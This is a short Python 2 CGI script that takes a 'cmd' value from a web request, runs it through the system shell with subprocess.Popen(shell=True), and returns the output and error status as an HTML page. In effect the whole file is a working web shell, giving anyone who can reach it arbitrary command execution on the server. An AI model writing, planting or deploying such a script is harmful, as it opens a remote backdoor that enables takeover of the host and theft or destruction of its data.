#!D:\Python 2.7\python.exe
import cgi
import subprocess

form = cgi.FieldStorage()
cmd = str(form.getvalue('cmd'))

print "Content-type:text/html\r\n\r\n"
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
(output, err) = p.communicate()
p_status = p.wait()
print "<b>Command Output :</b><br>",output[0:output.rfind('\n')]
print "<br><b>ERROR :</b><br>STATUS",p_status,"<br>MESSAGE",err
#output[0:output.find('\n')]
